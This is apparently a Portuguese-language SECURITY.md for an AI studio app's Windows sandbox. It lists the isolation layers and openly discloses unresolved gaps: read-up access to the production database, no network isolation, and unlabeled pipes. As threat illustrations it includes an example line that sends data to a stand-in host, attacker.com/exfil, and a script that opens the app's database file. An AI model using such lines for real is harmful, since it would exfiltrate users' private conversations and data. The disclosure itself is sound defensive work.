# Security Policy

> Frederico IA Studio — modelo de segurança do sandbox Windows
> (Fase 7, Etapa 5+).
>
> **Última atualização:** 2026-08-10 (Etapa 5+ fechada — `runtime:
> None → Sandboxed` reativado com path safety enforcement real).

## Resumo

O `frederico-tool-registry` (camada de tools) combina 4 camadas
de isolamento no subsistema `exec.*` (`exec.python`, `exec.node`)
quando roda no Windows:

1. **Path safety (Mandatory Label\Low)** — `SetFileSecurityW`
   no workdir aplica `SYSTEM_MANDATORY_LABEL_ACE_TYPE` no SACL
   com policy `NO_WRITE_UP`. Um processo com
   `TokenIntegrityLevel=Low` (nosso child) **não** consegue
   ler/escrever em paths com label Medium (default do
   filesystem), incluindo o parent do workdir, `%LOCALAPPDATA%`,
   `%APPDATA%`, `%TEMP%`, etc.
2. **Job Object per-invocation** — `KILL_ON_JOB_CLOSE` + limites
   de memória. Quando o `SandboxedProcess` é droppado, o Job
   handle fecha e o Windows mata **toda a árvore** (filho +
   netos + bisnetos). Garante tree-kill confiável mesmo que o
   `TerminateProcess` direto no PID falhe.
3. **Restricted Token** — `CreateRestrictedToken` dropa 6
   privilégios elevados (`SeDebug`, `SeBackup`, `SeRestore`,
   `SeTakeOwnership`, `SeLoadDriver`, `SeShutdown`) e seta
   `TokenIntegrityLevel = Low`. O child não consegue, por
   exemplo, abrir handles de outros processos (debug), ler
   arquivos de backup do sistema, ou carregar drivers.
4. **Env Filter** — allowlist fail-closed (`REQUIRED` +
   `ALLOWED` + `DENIED`). O env block do pai (que pode ter
   secrets em `OPENROUTER_API_KEY`, tokens, etc.) não vaza pro
   child sem filtragem explícita.

As 4 camadas juntas fecham os 3 vetores da Fase 7 — tree-kill
garantido (Job), privilégio escalonado bloqueado (Token), e
path traversal bloqueado (Label). Veja
[`docs/architecture/security-threat-model.md`](docs/architecture/security-threat-model.md)
para o threat model completo.

## O que essa combinação **NÃO** protege

Ser honesto sobre limitações é parte do contrato de segurança.
A Etapa 5+ fechou a **path safety** (write-up), mas **duas
lacunas** permanecem e estão documentadas como pendências
nomeadas (roadmap da Fase 7 → Fase 8). Não escondemos — o que
não está protegido está aqui.

### 1. **Read-up** (child pode ler paths Medium-labeled)

**Sintoma:** um child com `TokenIntegrityLevel=Low` consegue
**ler** paths com `Mandatory Label\Medium` (que é o default do
filesystem). Isso inclui, entre outros:

- `%LOCALAPPDATA%\studio\frederico\ia\data\frederico.db` (banco
  de produção)
- `%APPDATA%` (configurações de outros apps)
- `%USERPROFILE%\Documents` (documentos do user)
- Qualquer arquivo Medium sem label explícita

O Mandatory Label só bloqueia **write-up** (`NO_WRITE_UP`).
Para bloquear **read-up** também seria preciso `NO_READ_UP` na
policy, mas a **causa raiz** é que o child compartilha o token
do user (com SIDs do user, BUILTIN\Users, etc.) — o Windows
faz o DACL check **antes** do Mandatory Label, e o DACL permite
o user ler seus próprios arquivos.

**Por que não fechamos agora:** a solução real é um **SID
restritivo próprio** (random por invocação) adicionado como
`TokenRestrictedSids` no child token, **mais** um DACL custom
no workdir permitindo só esse SID. O child então **só** consegue
acessar o que o DACL permite (o workdir) — nem mesmo o resto
do home do user. Isso é trabalho de uma Etapa futura (roadmap
Fase 8) — mais complexo (geração/gestão de SID próprio,
serialização pra audit sink, ciclo de vida), mas é **o** caminho
que fecha o read-up.

**Risco concreto hoje:** um script Python rodando via
`exec.python` pode fazer `open(r"C:\Users\conta\AppData\Local\studio\frederico\ia\data\frederico.db", "rb")`
e ler o banco (que tem conversas, memórias, etc.). **Write**
é bloqueado — o child não consegue **modificar** o banco (o
que invalidaria a estratégia de "atômico: ou bumpa tudo ou
não bumpa nada"). Mas **read** está aberto.

**Mitigação temporária:** o Etapa 5+ mantém `exec.python` /
`exec.node` **fora** da allowlist default (são bumpados só
quando o usuário ativa explicitamente). O modelo default
não os vê no schema — usuário precisa aprovar primeiro.

### 2. **Rede** (child não está isolado de rede)

**Sintoma:** o child herda o acesso à rede do user. Pode
fazer `urllib.request.urlopen("https://attacker.com/exfil?data=...")` 
e exfiltrar o que leu (incluindo o banco, ver §1 acima).
Pode também baixar código (`pip install ...`) e executá-lo
fora do sandbox (o pip install roda dentro do child, mas
modifica `%LOCALAPPDATA%\pip\` que é Medium — child consegue
escrever lá, mesmo que o workdir esteja isolado).

**Por que não fechamos agora:** isolar a rede do child exige
um dos:

- **Windows Filtering Platform (WFP)** — API kernel-mode
  para filtro de pacotes por processo. Requer driver ou
  service de Windows; overhead alto, deployment complexo.
- **Network namespace** (Linux) — não-portável, e a Etapa 5+
  é Windows-only.
- **Proxy local no parent** (intercepts e loga todas as
  conexões do child via `WSAIoctl`/`SP_PROT`) — funciona,
  mas exige implementação dedicada (~500 LOC, Fases 8+).

**Risco concreto hoje:** um script Python rodando via
`exec.python` pode conectar em qualquer host na internet.
Combinado com o §1 (read-up do banco), isso é o vetor de
**exfiltração** mais sério que ainda existe no produto.

**Mitigação temporânea:** o `PermissionSet` tem `network: bool`
que o caller (UI de aprovação) controla por invocação. Quando
o `exec.python` é invocado via UI, o modal mostra "este script
pode acessar a rede" e o usuário decide. Mas **uma vez
aprovado, a rede está aberta** — sem filtro de domínios
(allowlist de `*.example.com`).

### 3. **Pipes stdout/stderr sem label** (child pode escrever
   em pipes anônimos Medium)

**Sintoma:** os pipes stdout/stderr do child são criados pelo
`CreatePipe` (no orchestrator), **sem** `Mandatory Label\Low`
no SACL. Decisão documentada no `crates/security/src/jail.rs`:
a tentativa de criar o pipe **com** label (passando
`SECURITY_ATTRIBUTES.lpSecurityDescriptor` com SACL) falha com
`ERROR_PRIVILEGE_NOT_HELD` (0x80070522) — `SeSecurityPrivilege`
é exigido pra criar kernel objects com SACL, e o app roda
sem privilégio elevado (decisão de projeto, instalação
per-user sem UAC).

**Impacto:** child (Low) **consegue** escrever nos pipes
porque eles são anônimos sem label — o Mandatory Label check
só compara contra objetos **com** label (objetos sem label
default = Medium, e o token Low é `<` Medium, então... espera,
Low < Medium, o check deveria bloquear).

**Esclarecimento:** pipes anônimos **sem label** passam o
Mandatory Label check porque o check é "se o objeto tem label
e a integridade do token < label, deny". Sem label no objeto,
não há deny — child escreve livre. Isso é **intencional** no
Windows: o Mandatory Label é uma proteção **opt-in** do owner
do objeto, não default deny. Sem label = sem proteção.

**Risco concreto:** child pode floodar stdout/stderr com dados
que o parent lê — mas o parent é o `frederico-tool-registry`,
que confia no child (é o `exec.python` que o próprio parent
invocou). O risco é **negativo** — não é uma escalada, é só
"o child consegue se comunicar de volta". Aceitável.

**Por que não fechamos agora:** exigiria `SeSecurityPrivilege`
no processo parent, que viola a decisão de projeto de rodar
sem UAC. Roadmap: em algum momento futuro, o instalador pode
criar um service Windows que aplica os labels (roda como
SYSTEM com SeSecurityPrivilege); o app user-mode chama o
service via RPC. Complexo, Fases 8+.

## Como reportar vulnerabilidades

Achou um bug de segurança? Abra uma issue com o label
`security` (ou envie email direto se preferir —
[Mavis@mavis.local] — **NÃO** poste detalhes em issue
pública antes do fix estar pronto). O Frederico IA Studio
trata vulnerabilidades como **P0** até análise.

## Auditoria

Toda decisão de segurança fica registrada em
[`docs/decisions/`](docs/decisions/) (ADRs) e referenciada
do código. As ADRs da Fase 7 relevantes:

- **ADR-0031** — Isolation model (Windows Job + Restricted Token
  + Env Filter)
- **ADR-0036** — `SecurityJailResolver` Windows (4 primitivas
  do sandbox)
- **ADR-0007** — Fronteira Win32 (apenas módulo `windows` tem
  `unsafe_code = "deny"`; resto é `forbid`)

Cobertura E2E em `crates/e2e/tests/`:

- `e2e_exec_python_under_sandbox.rs` (3 tests: path safety,
  wall-clock, hello world)
- `e2e_exec_node_under_sandbox.rs` (espelho Node)
- `tree_kill.rs` (Job Object)
- `jobs_test.rs` (Restricted Token)
- `env_filter.rs` (Env Filter)

Toda mudança na Etapa 5+ foi precedida de **TDD**: os 3 tests
acima foram **vistos falhando** (TDD passo 1) antes de
implementar a fix. Ver [Fase 7 Etapa 5+](docs/releases/fase-7/README.md).
